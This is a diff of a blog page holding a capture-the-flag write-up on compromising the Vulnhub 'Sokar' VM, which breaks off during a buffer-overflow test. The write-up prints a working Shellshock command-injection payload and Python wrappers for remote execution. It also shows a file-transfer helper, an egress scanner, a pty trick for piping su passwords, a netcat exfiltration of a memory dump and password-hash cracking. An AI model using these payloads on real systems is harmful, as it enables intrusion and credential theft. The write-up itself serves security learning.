@@ -1,40 +1,16 @@
-<!doctype html><html lang=en>
-<head>
-<title>
-beating sokar the vulnhub turns 0b10 challenge ::
-#!/bin/note
-— a checkbox uncheckers notepad
+<!doctype html><html lang=en dir=auto>
+<head><meta charset=utf-8>
+<meta http-equiv=x-ua-compatible content="IE=edge">
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
+<meta name=robots content="index, follow">
+<title>beating sokar the vulnhub turns 0b10 challenge | #!/bin/note
 </title>
-<meta charset=utf-8>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta name=description content="introduction Vulnhub is 0b10 years old. That is binary for 2 :) In order to celebrate this, @_RastaMouse created Sokar.
- Sokar was used as another writeup competition (the first for 2015), similar to the Persistence challenge from Sep &amp;lsquo;14. From the competition announcement blogpost, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag. Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.
-Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!
-Here is my entry for the competition. Enjoy! :)
-">
-<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
-<meta name=robots content="noodp">
-<link rel=canonical href=https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/>
-<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
-<link rel=stylesheet href=https://leonjza.github.io/style.css>
-<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
-<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
-<meta name=twitter:card content="summary">
-<meta name=twitter:title content="beating sokar the vulnhub turns 0b10 challenge">
-<meta name=twitter:description content="introduction
+<meta name=keywords content>
+<meta name=description content="introduction
 Vulnhub is 0b10 years old. That is binary for 2 :) In order to celebrate this, @_RastaMouse
 created Sokar.
 
-  
-    
-    
-  
+     
 
 
 Sokar was used as another writeup competition (the first for 2015), similar to the Persistence challenge from Sep &lsquo;14.
@@ -42,15 +18,28 @@ From the competition announcement blogpost, the rules of engagement were pretty 
 Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.
 Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!
 Here is my entry for the competition. Enjoy! :)">
-<meta property="og:title" content="beating sokar the vulnhub turns 0b10 challenge">
+<meta name=author content="Leon Jacobs">
+<link rel=canonical href=https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/>
+<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
+<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
+<link rel=icon href=https://leonjza.github.io/favicon.ico>
+<link rel=icon type=image/png sizes=16x16 href=https://leonjza.github.io/favicon-16x16.png>
+<link rel=icon type=image/png sizes=32x32 href=https://leonjza.github.io/favicon-32x32.png>
+<link rel=apple-touch-icon href=https://leonjza.github.io/apple-touch-icon.png>
+<link rel=mask-icon href=https://leonjza.github.io/safari-pinned-tab.svg>
+<meta name=theme-color content="#2e2e33">
+<meta name=msapplication-TileColor content="#2e2e33">
+<meta name=generator content="Hugo 0.88.1">
+<noscript>
+<style>#theme-toggle,.top-link{display:none}</style>
+<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
+</noscript>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script><meta property="og:title" content="beating sokar the vulnhub turns 0b10 challenge">
 <meta property="og:description" content="introduction
 Vulnhub is 0b10 years old. That is binary for 2 :) In order to celebrate this, @_RastaMouse
 created Sokar.
 
-  
-    
-    
-  
+     
 
 
 Sokar was used as another writeup competition (the first for 2015), similar to the Persistence challenge from Sep &lsquo;14.
@@ -63,89 +52,122 @@ Here is my entry for the competition. Enjoy! :)">
 <meta property="article:published_time" content="2015-02-21T15:55:03+00:00">
 <meta property="article:modified_time" content="2015-02-21T15:55:03+00:00"><meta property="og:site_name" content="#!/bin/note
 ">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="beating sokar the vulnhub turns 0b10 challenge">
+<meta name=twitter:description content="introduction
+Vulnhub is 0b10 years old. That is binary for 2 :) In order to celebrate this, @_RastaMouse
+created Sokar.
+
+     
+
+
+Sokar was used as another writeup competition (the first for 2015), similar to the Persistence challenge from Sep &lsquo;14.
+From the competition announcement blogpost, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag.
+Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.
+Sokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!
+Here is my entry for the competition. Enjoy! :)">
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://leonjza.github.io/posts/"},{"@type":"ListItem","position":3,"name":"beating sokar the vulnhub turns 0b10 challenge","item":"https://leonjza.github.io/blog/2015/02/21/beating-sokar-the-vulnhub-turns-0b10-challenge/"}]}</script>
+<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"beating sokar the vulnhub turns 0b10 challenge","name":"beating sokar the vulnhub turns 0b10 challenge","description":"introduction Vulnhub is 0b10 years old. That is binary for 2 :) In order to celebrate this, @_RastaMouse created Sokar.\n  Sokar was used as another writeup competition (the first for 2015), similar to the Persistence challenge from Sep \u0026lsquo;14. From the competition announcement blogpost, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag. Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.\nSokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!\nHere is my entry for the competition. Enjoy! :)\n","keywords":[],"articleBody":"introduction Vulnhub is 0b10 years old. That is binary for 2 :) In order to celebrate this, @_RastaMouse created Sokar.\n  Sokar was used as another writeup competition (the first for 2015), similar to the Persistence challenge from Sep ‘14. From the competition announcement blogpost, the rules of engagement were pretty familiar. Boot the VM, pwn it via the network and find the flag. Of course, modifying the VM in order to help you get the flag (things like single user mode, rescue disks etc) are not allowed and you have to actually be able to prove how you got r00t.\nSokar frustrated me. A lot. However, almost all of the challenges and configurations of Sokar were plausible. Most of the vulnerabilities are valid in the sense that it may as well be out there in wild. So, it was a great learning experience once again!\nHere is my entry for the competition. Enjoy! :)\na usual start You know the drill. Download the VM, import it into your virtualization software, configure the network and start to fire nmap at it. I followed exactly these steps apart from using the usual netdiscover to determine the assigned IP address. Instead, I recently learnt about the built in VMWare Network Sniffer. So I figured it was time to give that a spin.\nI knew which interface the network was bound to on my Mac, so I started the sniffer with sudo /Applications/VMware\\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1:\nleonjza@laptop » sudo /Applications/VMware\\ Fusion.app/Contents/Library/vmnet-sniffer vmnet1 [... snip IPv6 talky talky ...] IP src 0.0.0.0 dst 255.255.255.255 UDP src port 68 dst port 67 IP src 192.168.217.254 dst 192.168.217.163 UDP src port 67 dst port 68 192.168.217.163. Great. This will be our target for a nmap scan. Sokar did not respond to pings, but that is no biggie. I see this many times in real world networks too, so heh. Don’t rely on ICMP traffic ;)\nleonjza@kali/sokar $ nmap --reason 192.168.217.163 -p- Starting Nmap 6.47 ( http://nmap.org ) at 2015-02-02 21:09 SAST Nmap scan report for 192.168.217.163 Host is up, received arp-response (0.00027s latency). Not shown: 65534 filtered ports Reason: 65534 no-responses PORT STATE SERVICE REASON 591/tcp open http-alt syn-ack MAC Address: 08:00:27:F2:40:DB (Cadmus Computer Systems) Nmap done: 1 IP address (1 host up) scanned in 1133.72 seconds One port open on tcp. tcp/591.\n/cgi-bin/cat The service on tcp/591 appeared to be a web server. The web server content updated every time it was requested. Inspection of the web page sources revealed the information is actually sourced from a HTML  to http://192.168.217.163:591/cgi-bin/cat. Requesting this page alone was the same stats, minus that creepy pink color ;)\n  I toyed around quite a bit with this webserver. The textbook approach of running wfuzz to discover some web paths, nikto to discover some interesting information etc. was used. Alas, none of these tools proved really useful.\nApplying some more brain thingies to my current situation, I remembered the Shellshock bug disclosed in September 2014. The /cgi-bin path was the biggest hint towards it. I also remembered @mubix was keeping a Github repository of PoC’s for shellshock, and promptly started to try a few against the CGI path.\nEventually, this PoC was modified a little to get me some working command injection via shellshock:\nleonjza@kali/sokar $ curl -i -X OPTIONS -H \"User-Agent: () { :;};echo;/usr/bin/id\" \"http://192.168.217.163:591/cgi-bin/cat\" HTTP/1.1 200 OK Date: Mon, 02 Feb 2015 21:23:07 GMT Server: Apache/2.2.15 (CentOS) Connection: close Transfer-Encoding: chunked Content-Type: text/plain; charset=UTF-8 uid=48(apache) gid=48(apache) groups=48(apache) Yay. I was now able to execute commands as apache. This allowed me to enumerate a great deal of the machine with relative ease.\nmaking life easier Of course, constructing the curl request and header for every command that I wanted to run was starting to become boring really quickly. So, I slapped together some python that will accept an argument and execute the command (called shock.py):\n#!/usr/bin/python # Sokar Shellshock Command Execution # 2015 Leon Jacobs import requests import sys if len(sys.argv)  2: print \" * Usage %s\" % sys.argv[0] sys.exit(1) # vuln@ curl -i -X OPTIONS -H \"User-Agent: () { :;};echo;/bin/cat /etc/passwd\" \"http://192.168.217.163:591/cgi-bin/cat\" command = sys.argv[1].strip() print \" * Executing %s\\n\" % command # prepare the sploit header headers = { \"User-Agent\": \"() { :;};echo;%s\" % command } print requests.get(\"http://192.168.217.163:591/cgi-bin/cat\", headers=headers).text.strip() Using the above script, I could now just do python shock.py \"/usr/bin/id\":\nleonjza@kali/sokar $ python shock.py \"/usr/bin/id\" * Executing /usr/bin/id uid=48(apache) gid=48(apache) groups=48(apache) During the initial enumeration phase, I tried to build myself a reverse shell. I confirmed that netcat was available and that apache was allowed to execute it, however, all of my attempts failed. SELinux was disabled so that was not the problem. Eventually I started wondering about egress fire-walling and decided that it was time for a outbound port scan!\nI was able to write to /tmp, but for some reason I was having a really hard time getting newlines and quotes escaped so that I could essentially echo  /tmp/port_scan.py. Eventually I resorted to writing a helper called transfer.py that was used to copy files over from my local Kali Linux install to the Sokar VM. In the long run, this made it really easy to copy scripts and tools over to Sokar:\n#!/usr/bin/python # Sokar Shellshock File Transfer # 2015 Leon Jacobs import requests import sys import os import binascii def do_command(command): headers = { \"User-Agent\": \"() { :;};echo;%s\" % command } r = requests.options(\"http://192.168.217.163:591/cgi-bin/cat\", headers=headers) if not r.status_code == 200: raise Exception(\" ! Command %sfailed\") if __name__ == \"__main__\": if len(sys.argv)  3: print \" * Usage %s \" % sys.argv[0] sys.exit(1) # vuln@ curl -i -X OPTIONS -H \"User-Agent: () { :;};echo;/bin/cat /etc/passwd\" \"http://192.168.217.163:591/cgi-bin/cat\" source = sys.argv[1].strip() destination = sys.argv[2].strip() print \" * Starting transfer of local '%s' to remote '%s'\" % (source, destination) hex_destination_file = \"/tmp/\" + binascii.b2a_hex(os.urandom(15)) + \".txt\" print \" * Temp file on remote will be: %s\" % hex_destination_file # prepare a hex version of the local file with open(source) as f: source_file = f.read() # encode and split the source into chunks of 60 source_file = source_file.encode('hex') source_data = {} source_data = [source_file[i:i+60] for i in range(0, len(source_file), 60)] print \" * Transferring %dchunks to %s\" % (len(source_data), hex_destination_file) iteration = 1 for chunk in source_data: # check if it is start of file or append if iteration == 1: append = \"\" else: append = \"\" # prepare the command and run it command = \"echo '%s' %s%s\" % (chunk, append, hex_destination_file) do_command(command) print \" * Chunk %d/%dtransferred\" % (iteration, len(source_data)) iteration += 1 print \" * Decoding hex on remote\" command = \"/usr/bin/xxd -r -p %s %s\" % (hex_destination_file, destination) do_command(command) print \" * Cleaning up temp file %s\" % hex_destination_file command = \"/bin/rm -f %s\" % hex_destination_file do_command(command) print \" * Local '%s' transferred to remote '%s'\" % (source, destination) egress firewalls le-suck With the file transfer script done, I coded up a small ‘port scanner’ (though all it really does is try to connect to a port and move on to the next within 0.1s):\n#!/usr/bin/python # Sokar Egress Port Scanner # 2015 Leon Jacobs import socket for port in xrange(1, 65535): sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(0.1) print \"Trying port %d\" % port sock.connect_ex((\"192.168.217.174\", port)) sock.close() … and transferred it to Sokar using my transfer.py script:\nleonjza@kali/sokar $ python transfer.py port_scan.py /tmp/port_scan.py * Starting transfer of local 'port_scan.py' to remote '/tmp/port_scan.py' * Temp file on remote will be: /tmp/cf8ca858a40ecf06741824362c37df.txt * Transferring 10 chunks to /tmp/cf8ca858a40ecf06741824362c37df.txt * Chunk 1/10 transferred * Chunk 2/10 transferred * Chunk 3/10 transferred * Chunk 4/10 transferred * Chunk 5/10 transferred * Chunk 6/10 transferred * Chunk 7/10 transferred * Chunk 8/10 transferred * Chunk 9/10 transferred * Chunk 10/10 transferred * Decoding hex on remote * Cleaning up temp file /tmp/cf8ca858a40ecf06741824362c37df.txt * Local 'port_scan.py' transferred to remote '/tmp/port_scan.py' I also opened up a tcpdump on my local Kali Linux VM, filtering out tcp/591 as well as arp traffic:\nleonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes Finally, I fired the scanner off using the previously developed shock.py script:\nleonjza@kali/sokar $ python shock.py \"/usr/bin/python /tmp/port_scan.py\" * Executing /usr/bin/python /tmp/port_scan.py I waited… a really long time. I know poking at 65535 ports takes quite some time too so off I went to do other things. After quite some time, I returned to Sokar, to find that the tcpdump had no responses. I fiddled around with the scripts to check that I did not make a mistake but eventually I had to come to the conclusion that all outbound traffic is being filtered. Drat.\nbynarr the fruit Not having an interactive shell was not the end of the world. Instead of fussing about that I decided to move on to poking around some more. Enumeration revealed that /home/bynarr was readable to me. In there was what looked like a kernel module lime.ko and a script called lime to insmod it. Both were owned by root:\nleonjza@kali/sokar $ python shock.py \"/bin/cat /home/bynarr/lime\" * Executing /bin/cat /home/bynarr/lime #!/bin/bash echo \"\"\" ========================== Linux Memory Extractorator ========================== \" echo \"LKM, add or remove?\" echo -en \" \" read -e input if [ $input == \"add\" ]; then /sbin/insmod /home/bynarr/lime.ko \"path=/tmp/ram format=raw\" elif [ $input == \"remove\" ]; then /sbin/rmmod lime else echo \"Invalid input, burn in the fires of Netu!\" fi I knew that the chances were slim that it would allow me to run insmod as apache, but ofc I tried running the script regardless. Due to the fact that the file called /tmp/ram was not created after running python shock.py \"echo \\\"add\\\" | /home/bynarr/lime\", I assumed it failed.\nLater, some more enumeration finally got me to /var/spool/mail/bynarr with a message with the following contents:\nleonjza@kali/sokar $ python shock.py \"/bin/cat /var/spool/mail/bynarr\" * Executing /bin/cat /var/spool/mail/bynarr Return-Path:  Delivered-To: bynarr@localhost Received: from root by localhost To:  Date: Thu, 13 Nov 2014 22:04:31 +0100 Subject: Welcome Dear Bynarr. Welcome to Sokar Inc. Forensic Development Team. A user account has been setup for you. UID 500 (bynarr) GID 500 (bynarr) 501 (forensic) Password 'fruity'. Please change this ASAP. Should you require, you've been granted outbound ephemeral port access on 51242, to transfer non-sensitive forensic dumps out for analysis. All the best in your new role! -Sokar- I confirmed that bynarr was in the groups mentioned in the mail:\nleonjza@kali/sokar $ python shock.py \"/usr/bin/id bynarr\" * Executing /usr/bin/id bynarr uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic) What confused me here was the mention of “outbound ephemeral port access on 51242”. I reduced my port scanners range to only scan from 51240 to 51250 to confirm this. I transferred the updated port scanner to Sokar, opened up a new tcpdump session and waited anxiously. tcp/51242 outbound still appeared to be closed.\nOf course, the most valuable piece of information was definitely the password fruity. Now, remember, I have a limited shell. Not a interactive one. I have been interfacing with Sokar only via python scripts which are executing commands via Shellshock HTTP requests.\nEssentially, the easiest way for me to become bynarr (assuming fruity really is the password), would be to su right? Sounds like a 2 sec job. Well, it wasn’t :( Instead, I got caught up in a whole bunch of interesting situations where su expects a password via stdin, requires a valid tty (which I don’t have) and will spawn a shell for me to interact with (which I can’t). Quite some time later, I got closer to becoming bynarr with something like echo fruity | su bynarr. To add to the pain, my shellshock shell also did not have a proper environment, so I had to prefix most commands with their full paths. Luckily though $(which id) came in very handy and saved some time. In retrospect, I could have probably just exported PATH as required, but heh.\nFast forward some time, I came across this SANS blogpost, which details on the topic of some ‘stealthy’ su shells. Most importantly, the example of (sleep 1; echo password) | python -c \"import pty; pty.spawn(['/bin/su','-c','whoami']);\" got me the closest to bynarr. Toying around with this a little, I realized that for some reason, the ( and ) characters were messing around, so I replaced that section with some python too. After a whole bunch attempts, I eventually got this to work:\n/usr/bin/python -c \"import time; time.sleep(1); print 'fruity'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);\"\n(Basically, spawn a tty; attempt to su specifying the command to run with -c, then 1 second later, echo fruity to the Password prompt and execute id as bynarr)\nleonjza@kali/sokar $ python shock.py \"/usr/bin/python -c \\\"import time; time.sleep(1); print 'fruity'\\\" | /usr/bin/python -c \\\"import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);\\\"\" * Executing /usr/bin/python -c \"import time; time.sleep(1); print 'fruity'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);\" Password: uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic) :D As this is actually a Shellshock request, the full User-Agent header therefore was:\n() { :;};echo;/usr/bin/python -c \"import time; time.sleep(1); print 'fruity'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);\" Again, constructing that every time I want to execute something as bynarr would have been le-suck, so I made another wrapper script:\n#!/usr/bin/python # Sokar 'bynarr' command execution # 2015 Leon Jacobs import requests import sys if len(sys.argv)  2: print \" * Usage %s\" % sys.argv[0] sys.exit(1) command = sys.argv[1].strip() payload = \"\"\"/usr/bin/python -c \"import time; time.sleep(1); print 'fruity'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su','-c','%s', 'bynarr']);\" \"\"\" % command print \" * Executing %s\\n\" % payload # prepare the sploit header headers = { \"User-Agent\": \"() { :;};echo;%s\" % payload } print requests.get(\"http://192.168.217.163:591/cgi-bin/cat\", headers=headers).text.strip() All I have to do to get the output of id is provide it as a argument to bynarr.py:\nleonjza@kali/sokar $ python bynarr.py \"id\" * Executing /usr/bin/python -c \"import time; time.sleep(1); print 'fruity'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su','-c','id', 'bynarr']);\" Password: uid=500(bynarr) gid=501(bynarr) groups=501(bynarr),500(forensic) the scary linux memory extractor With command access as bynarr and remembering the mention of tcp/51242 outbound connectivity, I once more try and run the port scanner that got copied to /tmp:\nleonjza@kali/sokar $ python bynarr.py \"/usr/bin/python /tmp/port_scan.py\" * Executing /usr/bin/python -c \"import time; time.sleep(1); print 'fruity'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su','-c','/usr/bin/python /tmp/port_scan.py', 'bynarr']);\" Password: Trying port 51240 Trying port 51241 Trying port 51242 Trying port 51243 Trying port 51244 Trying port 51245 Trying port 51246 Trying port 51247 Trying port 51248 Trying port 51249 Checking the tcpdump output of this run…:\nleonjza@kali/sokar $ tcpdump -i eth1 not arp and not port 591 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes 07:33:43.178113 IP 192.168.217.163.40371  192.168.217.174.51242: Flags [S], seq 594732851, win 14600, options [mss 1460,sackOK,TS val 2274844 ecr 0,nop,wscale 4], length 0 07:33:43.178129 IP 192.168.217.174.51242  192.168.217.163.40371: Flags [R.], seq 0, ack 594732852, win 0, length 0 … I finally see something coming out of Sokar! So bynarr is able to talk out on tcp/51242. Wut. Taking a few moments to think about this, I remembered that iptables is able to filter by user id using the owner module. At this stage, this was the only thing that made sense why apache would not be able to talk out on this port, but bynarr can.\nSo with that out the way, it was time to focus on this lime thing. bynarr was allowed to run /home/bynarr/lime as root via sudo without a password (as I suspected for the insmod):\nleonjza@kali/sokar $ python bynarr.py \"sudo -l\" * Executing /usr/bin/python -c \"import time; time.sleep(1); print 'fruity'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su','-c','sudo -l', 'bynarr']);\" Password: Matching Defaults entries for bynarr on this host: !requiretty, visiblepw, always_set_home, env_reset, env_keep=\"COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS\", env_keep+=\"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE\", env_keep+=\"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES\", env_keep+=\"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE\", env_keep+=\"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY\", secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/bin User bynarr may run the following commands on this host: (ALL) NOPASSWD: /home/bynarr/lime I had no freaking idea what lime even really is, so, to the Gooooogles I went and came across this: https://github.com/504ensicsLabs/LiME. A forensics tool thingy thing. It seems like I will get to crawl through a dump of the current memory. Cool ;p\nI ran the script to insmod the lime.ko, this time with sudo:\nleonjza@kali/sokar $ python bynarr.py \"echo \\\"add\\\" | sudo /home/bynarr/lime\" * Executing /usr/bin/python -c \"import time; time.sleep(1); print 'fruity'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su','-c','echo \"add\" | sudo /home/bynarr/lime', 'bynarr']);\" Password: ========================== Linux Memory Extractorator ========================== LKM, add or remove?  I checked /tmp for the existence of the ram file and it was present. Looks like it worked :D. A quick note here. When I imported the VM initially, I upped the memory to 2GB. It was set to only have 256Mb by default which I thought was a little low. Sokar has limited disk space, so I was not getting the full memory dump. When I eventually noticed this, I reduced it back to the initial 256Mb and worked from there.\nRemembering the outbound port access, I opened a netcat listener on my local Kali linux to redirect a incoming file to a local ram file with nc -lvp 51242  ram. Then, using my wrapper script bynarr.py again, I redirected the /tmp/ram file out over the netcat connection with: python bynarr.py \"/usr/bin/nc 192.168.217.174 51242 . I now had a memory dump of Sokar on my local Kali Linux.\nIt was at this stage that I went down the wrong rabbit hole. Volatility was the first thing that came to mind when I saw this speak of memory dumps and what not. Having always just had this on my todo list, I figured that this was the perfect opportunity to finally give it a spin. I followed most of the docs to try and match the exact same kernel version as Sokar had (I have a number of CentOS VM’s) and prepared a profile as required. Short version, it failed. I was not able to get Volatility to give me anything useful. Eventually I reconsidered my approach and went back to trusty ‘ol strings.\nI had to think a bit about what could possibly be useful in memory for me now. I noticed the user apophis had a home directory that I have not yet been able to access, so I promptly grepped the ram image for this user:\nleonjza@kali/sokar $ strings ram | grep apophis [... snip ...] apophis:[snip]0HQCZwUJ$rYYSk9SeqtbKv3aEe3kz/RQdpcka8K.2NGpPveVrE5qpkgSLTtE.Hvg0egWYcaeTYau11ahsRAWRDdT8jPltH.:16434:0:99999:7::: … wut. Why… wait a sec. Why the heck is a password hash in memory now. Dont think there has been any activity for this user yet… but clearly I don’t understand half of the technicalities here :( But hey. Lets run it through john:\nleonjza@kali/sokar $ john passwd --wordlist=/usr/share/wordlists/rockyou.txt Warning: detected hash type \"sha512crypt\", but the string is also recognized as \"crypt\" Use the \"--format=crypt\" option to force loading these as that type instead Loaded 1 password hash (sha512crypt [32/32]) overdrive (apophis) guesses: 1 time: 0:00:01:51 DONE (Sat Jan 31 20:35:42 2015) c/s: 327 trying: parati - nicole28 Use the \"--show\" option to display all of the cracked passwords reliably apophis:overdrive.\nbuild the clone to the hook To get command execution as apophis.py I copied the bynarr.py script to make apophis.py, changing the username and the password.\nleonjza@kali/sokar $ python apophis.py \"id\" * Executing /usr/bin/python -c \"import time; time.sleep(2); print 'overdrive'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su', '-l', '-c','id', 'apophis']);\" Password: uid=501(apophis) gid=502(apophis) groups=502(apophis) There we go! Command execution as apophis :) In /home/apophis there was a suid (for root) binary called build:\nleonjza@kali/sokar $ python apophis.py \"ls -lah /home/apophis\" * Executing /usr/bin/python -c \"import time; time.sleep(2); print 'overdrive'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su', '-l', '-c','ls -lah /home/apophis', 'apophis']);\" Password: total 36K drwx------ 2 apophis apophis 4.0K Jan 2 20:12 . drwxr-xr-x. 4 root root 4.0K Dec 30 19:20 .. -rw------- 1 apophis apophis 9 Feb 2 20:55 .bash_history -rw-r--r-- 1 apophis apophis 18 Feb 21 2013 .bash_logout -rw-r--r-- 1 apophis apophis 176 Feb 21 2013 .bash_profile -rw-r--r-- 1 apophis apophis 124 Feb 21 2013 .bashrc -rwsr-sr-x 1 root root 8.3K Jan 2 17:49 build I thought I would copy this build binary off the box as I don’t exactly have a nice interactive shell to work with yet. apophis was also not able to to connect via tcp/51242 outbound, which further confirmed my suspicions on the user module being used in iptables. I copied the binary to /tmp/build and pushed it out via netcat as bynarr (using my helper script) towards my local Kali linux install. Finally I had build locally to play with.\nI later noticed it was a 64bit binary, so I had to move it over to my 64bit install of Kali Linux to inspect further. Running it asked you if you wanted to ‘build?':\nleonjza@kali/sokar $ ./build Build? (Y/N) Y Cloning into '/mnt/secret-project'... ssh: Could not resolve hostname sokar-dev:: Name or service not known fatal: The remote end hung up unexpectedly That looks very much like the output of a git clone attempt. Knowing what the binary expects now, I continued to run this on Sokar via my Shellshock wrapper for apophis:\nleonjza@kali/sokar $ python apophis.py \"echo Y | /home/apophis/build\" * Executing /usr/bin/python -c \"import time; time.sleep(2); print 'overdrive'\" | /usr/bin/python -c \"import pty; pty.spawn(['/bin/su', '-l', '-c','echo Y | /home/apophis/build', 'apophis']);\" Password: Cloning into '/mnt/secret-project'... ssh: Could not resolve hostname sokar-dev: Temporary failure in name resolution fatal: Could not read from remote repository. Please make sure you have the correct access rights and the repository exists. Build? (Y/N) The same hostname resolution failure occurred. Hmm. Thinking about this, it looks like it is trying to clone a repository (as root??) to /mnt/secret-project from sokar-dev which does not resolve.\nthe impossible b0f I was very unsure about what the next move should be. Playing around some more with the binary, it appeared as though there may be a buffer overflow problem when providing a answer to build.:\nleonjza@kali/sokar $ ./build Build? (Y/N) YY *** buffer overflow detected ***: ./build terminated ======= Backtrace: ========= /lib/x86_64-linux-gnu/libc.so.6(__fortify_fail+0x37)[0x2b53e6df5fe7] /lib/x86_64-linux-gnu/libc.so.6(+0xefea0)[0x2b53e6df4ea0] /lib/x86_64-linux-gnu/libc.so.6(__gets_chk+0x195)[0x2b53e6df4df5] ./build(main+0xea)[0x2b53e68e29d9] /lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xfd)[0x2b53e6d23ead] ./build(+0x7d9)[0x2b53e68e27d9] ======= Memory map: ======== 2b53e68e2000-2b53e68e3000 r-xp 00000000 fe:00 667555 /root/sokar/build 2b53e68e3000-2b53e68e7000 rwxp 00000000 00:00 0 2b53e6900000-2b53e6902000 rwxp 00000000 00:00 0 2b53e6ae2000-2b53e6ae3000 rwxp 00000000 fe:00 667555 /root/sokar/build 2b53e6ae3000-2b53e6b03000 r-xp 00000000 fe:00 532890 /lib/x86_64-linux-gnu/ld-2.13.so 2b53e6d02000-2b53e6d03000 r-xp 0001f000 fe:00 532890 /lib/x86_64-linux-gnu/ld-2.13.so 2b53e6d03000-2b53e6d04000 rwxp 00020000 fe:00 532890 